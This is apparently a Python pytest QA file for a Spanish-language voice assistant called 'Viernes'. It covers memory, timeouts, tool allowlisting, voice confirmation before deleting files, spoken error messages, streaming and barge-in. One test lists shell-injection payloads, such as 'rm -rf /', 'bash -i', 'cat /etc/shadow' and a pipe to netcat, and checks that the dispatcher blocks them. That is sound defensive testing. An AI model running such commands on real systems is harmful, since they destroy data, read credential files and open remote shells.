import asyncio
import subprocess
import sys
import time
from pathlib import Path

import pytest

from viernes.brain.antigravity_client import (
    FALLBACK_DEGRADED_RESPONSE,
    AntigravityAgent,
)
from viernes.brain.memory import ConversationMemory
from viernes.brain.mock import MockAgent
from viernes.brain.prompt import VIERNES_SYSTEM_PROMPT
from viernes.pipeline.barge_in import BargeInController, SystemState
from viernes.pipeline.playback_queue import SequentialPlaybackQueue
from viernes.pipeline.streaming_pipeline import StreamingPipeline
from viernes.tools.confirmation import ConfirmationDecision, ConfirmationManager
from viernes.tools.dispatcher import ToolDispatcher
from viernes.tools.error_handler import (
    AssistantState,
    ToolExceptionMiddleware,
)
from viernes.tools.registry import (
    DEFAULT_ALLOWLIST,
    OpenAppParams,
    SystemDeleteFileParams,
    ToolDefinition,
    ToolRegistry,
)
from viernes.tools.security import SecurityViolationError

# ============================================================================
# QA TEST 1: BRAIN ORCHESTRATION & TIMEOUT RESILIENCE (HU-09)
# ============================================================================


def test_qa_brain_memory_and_system_prompt() -> None:
    """Verifies that the brain retains recent conversational context and system prompt."""
    memory = ConversationMemory(max_turns=3)
    memory.add_turn("¿Cómo me llamo?", "Te llamas Fabio.")
    memory.add_turn("¿Y cuál es mi proyecto?", "Tu proyecto es Viernes.")

    agent = AntigravityAgent(
        memory=memory,
        custom_invoker=lambda prompt, to: f"Viernes entendió: {prompt}",
    )
    assert agent.system_prompt == VIERNES_SYSTEM_PROMPT

    response = agent.ask("¿Dónde trabajo?")
    assert "Fabio" in response
    assert "Viernes" in response
    assert len(agent.memory.get_messages()) == 6


def test_qa_brain_timeout_degradation() -> None:
    """Verifies that an agent call exceeding 10s degrades gracefully without crashing."""

    def timeout_invoker(p: str, to: float) -> str:
        raise TimeoutError("Reasoning timed out")

    agent = AntigravityAgent(custom_invoker=timeout_invoker, timeout=0.1)
    res = agent.ask("Petición muy compleja")
    assert res == FALLBACK_DEGRADED_RESPONSE


# ============================================================================
# QA TEST 2: MCP SECURITY GATE & INJECTION BLOCKING (HU-10)
# ============================================================================


def test_qa_mcp_security_allowlist_and_injection_gate() -> None:
    """Verifies strict allowlist enforcement and blocks arbitrary shell injections."""
    registry = ToolRegistry(allowlist=DEFAULT_ALLOWLIST)
    registry.register(
        ToolDefinition(
            name="system_open_app",
            description="Open app",
            param_schema=OpenAppParams,
            handler=lambda p: f"App {p.app_name} abierta",
        )
    )
    dispatcher = ToolDispatcher(registry=registry)

    # 1. Unregistered tool is blocked
    with pytest.raises(SecurityViolationError):
        dispatcher.dispatch("unregistered_tool", {})

    # 2. Injections with pipes, semicolons, backticks are rejected
    malicious_payloads = [
        "spotify; rm -rf /",
        "calc && bash -i",
        "app `cat /etc/shadow`",
        "player | nc 1.2.3.4 9999",
    ]
    for payload in malicious_payloads:
        with pytest.raises((SecurityViolationError, ValueError)):
            dispatcher.dispatch("system_open_app", {"app_name": payload})

    # 3. Legitimate invocation succeeds and is audited without secrets
    res = dispatcher.dispatch("system_open_app", {"app_name": "spotify"})
    assert res == "App spotify abierta"
    assert dispatcher.audit_logger.records[-1].status == "SUCCESS"


# ============================================================================
# QA TEST 3: VOICE CONFIRMATION FOR DESTRUCTIVE ACTIONS (HU-11)
# ============================================================================


@pytest.mark.anyio
async def test_qa_voice_confirmation_lifecycle() -> None:
    """Verifies spoken confirmation question, affirmative execution, and auto-cancellation."""
    registry = ToolRegistry(allowlist=DEFAULT_ALLOWLIST)
    confirmation_mgr = ConfirmationManager(timeout_seconds=0.2)

    tool = ToolDefinition(
        name="system_delete_file",
        description="Delete file",
        param_schema=SystemDeleteFileParams,
        handler=lambda p: f"Archivo {p.target_path} borrado",
        requires_confirmation=True,
        impact_formatter=lambda p: f"borrar el archivo {p.target_path}",
    )
    registry.register(tool)
    dispatcher = ToolDispatcher(registry=registry, confirmation_manager=confirmation_mgr)

    # 1. First invocation demands confirmation
    prompt = dispatcher.dispatch("system_delete_file", {"target_path": "/tmp/test.log"})
    assert "¿Confirmas que deseas borrar el archivo /tmp/test.log?" in prompt
    assert confirmation_mgr.pending_action is not None

    # 2. Affirmative response approves and allows execution
    async def say_yes():
        return "Adelante, confirmo"

    decision, _ = await confirmation_mgr.wait_for_voice_confirmation(
        confirmation_mgr.pending_action, say_yes
    )
    assert decision == ConfirmationDecision.APPROVED
    result = dispatcher.dispatch(
        "system_delete_file", {"target_path": "/tmp/test.log"}, is_confirmed=True
    )
    assert result == "Archivo /tmp/test.log borrado"


# ============================================================================
# QA TEST 4: ERROR HANDLING & NATURAL SPOKEN TRANSLATION (HU-12)
# ============================================================================


def test_qa_error_translation_and_idle_recovery() -> None:
    """Verifies global exception capture, jargon-free speech, and clean IDLE transition."""
    spoken_history: list[str] = []
    middleware = ToolExceptionMiddleware(tts_speaker=lambda msg: spoken_history.append(msg))

    def network_crashing_tool():
        raise ConnectionResetError("Connection refused by upstream HTTP 503 gateway")

    success, result, spoken_err = middleware.execute_safely(
        network_crashing_tool, tool_name="system_weather"
    )

    assert success is False
    assert result is None
    assert "servicio no responde" in spoken_err
    assert "503" not in spoken_err
    assert middleware.current_state == AssistantState.IDLE
    assert len(spoken_history) == 1


# ============================================================================
# QA TEST 5: SENTENCE STREAMING PIPELINE & CONCURRENCY (HU-13)
# ============================================================================


@pytest.mark.anyio
async def test_qa_sentence_streaming_pipeline(tmp_path: Path) -> None:
    """Verifies tokenizer, async TTS synthesis dispatch, and zero audio overlap."""
    agent = MockAgent(
        default_response="Hola Fabio. Hoy tienes tres tareas pendientes en TickTick. Recuerda revisar tu correo."
    )

    synthesized_chunks: list[str] = []

    def fake_tts(text: str, out: Path) -> Path:
        synthesized_chunks.append(text)
        out.write_bytes(b"dummy_audio")
        return out

    played_chunks: list[Path] = []

    async def fake_player(path: Path) -> None:
        await asyncio.sleep(0.02)
        played_chunks.append(path)

    queue = SequentialPlaybackQueue(fake_player)
    pipeline = StreamingPipeline(
        agent=agent,
        tts_synthesizer=fake_tts,
        playback_queue=queue,
        temp_dir=tmp_path,
    )

    metrics = await pipeline.execute("Mis tareas de hoy")
    await queue.join()
    await queue.stop()

    assert metrics.sentences_count >= 2
    assert len(synthesized_chunks) >= 2
    assert len(played_chunks) >= 2
    assert metrics.first_audio_latency_seconds < 1.2


# ============================================================================
# QA TEST 6: BARGE-IN INTERRUPTION & ZERO-ZOMBIE STRESS TEST (HU-14)
# ============================================================================


def test_qa_barge_in_and_zombie_stress_test(tmp_path: Path) -> None:
    """Verifies barge-in stops playback in < 150ms, clears queue, and leaves 0 zombie processes."""
    proc: subprocess.Popen | None = None
    queue = SequentialPlaybackQueue(lambda p: None)
    for i in range(10):
        queue._queue.put_nowait(tmp_path / f"chunk_{i}.mp3")

    state_transitions: list[SystemState] = []
    controller = BargeInController(
        playback_queue=queue,
        active_process_supplier=lambda: proc,
        on_state_transition=lambda s: state_transitions.append(s),
    )

    # Stress test 15 interruptions with live subprocesses
    for _ in range(15):
        proc = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(5)"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        assert proc.poll() is None

        start = time.perf_counter()
        interrupted = controller.handle_voice_detected(
            mic_energy=0.9, speaker_energy=0.1, vad_active=True
        )
        duration_ms = (time.perf_counter() - start) * 1000

        assert interrupted is True
        assert duration_ms < 150.0  # Under 150ms target
        assert proc.poll() is not None  # Process terminated cleanly
        assert queue._queue.qsize() == 0  # Queue drained
        assert controller.current_state == SystemState.RECORDING

    assert SystemState.RECORDING in state_transitions
